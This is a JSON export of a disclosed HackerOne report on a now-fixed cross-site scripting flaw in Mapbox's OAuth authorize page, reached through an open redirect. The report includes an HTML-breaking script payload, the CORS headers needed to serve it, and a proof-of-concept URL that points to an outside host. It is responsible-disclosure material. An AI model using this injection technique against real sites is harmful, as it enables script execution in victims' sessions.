{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-08-01T10:17:07.629Z", 
    "voters": [
        "bl4de", 
        "europa", 
        "bogdantcaciuc", 
        "yumi", 
        "eveeez", 
        "aroly", 
        "silv3rpoision", 
        "japz", 
        "smit", 
        "hacklad", 
        "and 3 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 143240, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-08-14T17:19:31.568Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "XSS on www.mapbox.com/authorize/ because of open redirect at /core/oauth/auth", 
    "is_member_of_team?": null, 
    "vote_count": 13, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-08-31T10:17:07.765Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-06-05T20:37:57.613Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-05T20:37:57.613Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "Link to video: https://vimeo.com/169458232\nPassword: `xssbringtoyoubystefano`", 
            "markdown_message": "<p>Link to video: <a title=\"https://vimeo.com/169458232\" href=\"/redirect?signature=4288d99fc75e489b21cb0e7f20aa8cc6f73f8944&amp;url=https%3A%2F%2Fvimeo.com%2F169458232\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vimeo.com/169458232</span><i class=\"icon-external-link\"></i></a><br>\nPassword: <code>xssbringtoyoubystefano</code></p>\n", 
            "type": "Activities::Comment", 
            "id": 1000508, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-08T19:49:33.692Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-08T19:49:33.692Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 1005214, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "stefanofinding", 
                "url": "/stefanofinding"
            }, 
            "created_at": "2016-09-28T22:34:26.804Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-28T22:34:26.804Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "Apologies for the wait on this @stefanofindsbugs. We just deployed a patch this evening - can you confirm the fix? ", 
            "markdown_message": "<p>Apologies for the wait on this <a href=\"/stefanofindsbugs\">@stefanofindsbugs</a>. We just deployed a patch this evening - can you confirm the fix? </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1222661, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-29T00:50:40.158Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-29T00:50:40.158Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "No worries. \nI can't reproduce the issue anymore.", 
            "markdown_message": "<p>No worries. <br>\nI can&#39;t reproduce the issue anymore.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1222845, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-09-29T22:51:34.640Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-29T22:51:34.640Z", 
            "actor": {
                "url": "/mapbox", 
                "profile": {
                    "name": "Mapbox"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/366/7b4be0ae1ca280967179d25468223df76dd9074c_medium.jpg?1492717660"
                }
            }, 
            "team_handle": "mapbox", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "stefanofinding", 
                "url": "/stefanofinding"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1224800, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-30T00:14:38.622Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-30T00:14:38.622Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "Thank you for the bounty!", 
            "markdown_message": "<p>Thank you for the bounty!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1224885, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-01T10:17:07.710Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-01T10:17:07.710Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "first_to_agree": true, 
            "message": "It would be great if you agree to disclose this report. Thanks!", 
            "markdown_message": "<p>It would be great if you agree to disclose this report. Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1881877, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-14T17:19:31.599Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-14T17:19:31.599Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1927376, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-14T17:19:31.636Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-14T17:19:31.636Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1927377, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "stefanofinding", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/stefanofinding", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/171/2b150e9b5657fcec95fe3961ebc01a9d5df9afb4_small.png?1509532580"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -39961046.762936816, 
    "disclosed_at": "2017-08-14T17:19:31.620Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/143240", 
    "created_at": "2016-06-05T20:23:44.276Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"description\">Description</h2>\n\n<p>When you load the endpoint <a title=\"https://www.mapbox.com/authorize/\" href=\"/redirect?signature=9b89971f8aa50cb3f2301802115d14f63ac4a626&amp;url=https%3A%2F%2Fwww.mapbox.com%2Fauthorize%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mapbox.com/authorize/</span><i class=\"icon-external-link\"></i></a> a GET request is made to the endpoint <a title=\"https://www.mapbox.com/core/oauth/auth\" href=\"/redirect?signature=f46a7eceb6f20b50eb8dd3e9ace54c316c5bbaac&amp;url=https%3A%2F%2Fwww.mapbox.com%2Fcore%2Foauth%2Fauth\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mapbox.com/core/oauth/auth</span><i class=\"icon-external-link\"></i></a> with the parameters passed in the request to <a title=\"https://www.mapbox.com/authorize/\" href=\"/redirect?signature=9b89971f8aa50cb3f2301802115d14f63ac4a626&amp;url=https%3A%2F%2Fwww.mapbox.com%2Fauthorize%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mapbox.com/authorize/</span><i class=\"icon-external-link\"></i></a>. <br>\nIf you only send the parameter <strong>redirect_uri</strong> in the request to <a title=\"https://www.mapbox.com/core/oauth/auth\" href=\"/redirect?signature=f46a7eceb6f20b50eb8dd3e9ace54c316c5bbaac&amp;url=https%3A%2F%2Fwww.mapbox.com%2Fcore%2Foauth%2Fauth\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mapbox.com/core/oauth/auth</span><i class=\"icon-external-link\"></i></a>, the response from the server is a 302 redirect to the value passed in the parameter <strong>redirect_uri</strong>.<br>\nIf the response from the latest request (after the redirect) is valid like:</p>\n<pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;authorize_url&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;/authrozie/...&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;stage&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;authorize&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;user&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;some-name&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;extraTm2z&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"w\">\n  </span><span class=\"p\">},</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;origin&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;&quot;</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<p>the content is used to render the template <strong>template-modal-oauth</strong> in <a title=\"https://www.mapbox.com/authorize/\" href=\"/redirect?signature=9b89971f8aa50cb3f2301802115d14f63ac4a626&amp;url=https%3A%2F%2Fwww.mapbox.com%2Fauthorize%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mapbox.com/authorize/</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>The problem is that the value of the property <code>&quot;authorize_url&quot;</code> is not escaped when passed to the template</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;form</span> <span class=\"na\">id=</span><span class=\"s\">&#39;oauth&#39;</span> <span class=\"na\">method=</span><span class=\"s\">&#39;post&#39;</span> <span class=\"na\">action=</span><span class=\"s\">&#39;&lt;%=App.api + obj.authorize_url%&gt;&#39;</span> <span class=\"na\">class=</span><span class=\"s\">&#39;col6 modal-body fill-white&#39;</span><span class=\"nt\">&gt;</span>\n...\n</code></pre>\n<p>which allows to break the <code>&lt;form&gt;</code> using <code>&#39;&gt;</code> and insert HTML and Javascript code.</p>\n\n<h2 id=\"reproduction-steps\">Reproduction steps</h2>\n\n<ol>\n<li>\n<p>Create a file with this content in a server that supports <strong>https://</strong></p>\n<pre class=\"highlight json\"><code><span class=\"w\">  </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;authorize_url&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;&#39;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;stage&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;authorize&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;user&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;nombre&quot;</span><span class=\"p\">,</span><span class=\"w\">\n      </span><span class=\"s2\">&quot;extraTm2z&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"w\">\n   </span><span class=\"p\">},</span><span class=\"w\">\n   </span><span class=\"s2\">&quot;origin&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;&quot;</span><span class=\"w\">\n </span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n</li>\n<li>\n<p>Set these headers to be returned in the response when serving the file (I don&#39;t specify how because it varies from server to server and language)</p>\n<pre class=\"highlight plaintext\"><code>  Access-Control-Allow-Origin: https://www.mapbox.com\n  Access-Control-Allow-Credentials: true\n  Access-Control-Allow-Headers: x-requested-with\n</code></pre>\n</li>\n<li>\n<p>Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge</p>\n<pre class=\"highlight plaintext\"><code>  https://www.mapbox.com/authorize/?redirect_uri=[url_to_file_created_in_step_1]\n</code></pre>\n</li>\n<li><p><code>alert(document.domain)</code> is executed</p></li>\n</ol>\n\n<h2 id=\"proof-of-concept\">Proof of concept</h2>\n\n<p>Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge</p>\n<pre class=\"highlight plaintext\"><code>https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json\n</code></pre>\n<p>I&#39;m going to do a screen recording and upload it.</p>\n", 
    "vulnerability_information": "Description\n---\nWhen you load the endpoint https://www.mapbox.com/authorize/ a GET request is made to the endpoint https://www.mapbox.com/core/oauth/auth with the parameters passed in the request to https://www.mapbox.com/authorize/. \nIf you only send the parameter __redirect_uri__ in the request to https://www.mapbox.com/core/oauth/auth, the response from the server is a 302 redirect to the value passed in the parameter __redirect_uri__.\nIf the response from the latest request (after the redirect) is valid like:\n```json\n{\n  \"authorize_url\": \"/authrozie/...\",\n  \"stage\": \"authorize\",\n  \"user\": {\n    \"name\": \"some-name\",\n    \"extraTm2z\": 1\n  },\n  \"origin\": \"\"\n}\n```\nthe content is used to render the template __template-modal-oauth__ in https://www.mapbox.com/authorize/.\n\nThe problem is that the value of the property `\"authorize_url\"` is not escaped when passed to the template\n```html\n<form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' class='col6 modal-body fill-white'>\n...\n```\nwhich allows to break the `<form>` using `'>` and insert HTML and Javascript code.\n\nReproduction steps\n---\n1. Create a file with this content in a server that supports __https://__\n\n      ```json\n      {\n        \"authorize_url\": \"'><script>alert(document.domain);</script>\",\n        \"stage\": \"authorize\",\n        \"user\": {\n          \"name\": \"nombre\",\n          \"extraTm2z\": 1\n       },\n       \"origin\": \"\"\n     }\n     ```\n\n2. Set these headers to be returned in the response when serving the file (I don't specify how because it varies from server to server and language)\n\n      ```\n      Access-Control-Allow-Origin: https://www.mapbox.com\n      Access-Control-Allow-Credentials: true\n      Access-Control-Allow-Headers: x-requested-with\n      ```\n\n3. Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge\n\n      ```\n      https://www.mapbox.com/authorize/?redirect_uri=[url_to_file_created_in_step_1]\n      ```\n\n4. `alert(document.domain)` is executed\n\nProof of concept\n---\nLoad the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge\n```\nhttps://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json\n```\n\nI'm going to do a screen recording and upload it.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.mapbox.com/security", 
            "about": "Mapbox is an open source mapping platform for developers. We make it easy to integrate location into any mobile or online application.", 
            "twitter_handle": "mapbox", 
            "name": "Mapbox"
        }, 
        "handle": "mapbox", 
        "url": "https://hackerone.com/mapbox", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/366/d535aeefcbd60f460a1d1e9769a180722e4343e9_small.jpg?1492717660", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/366/7b4be0ae1ca280967179d25468223df76dd9074c_medium.jpg?1492717660"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1366, 
        "default_currency": "usd"
    }, 
    "is_published": false
}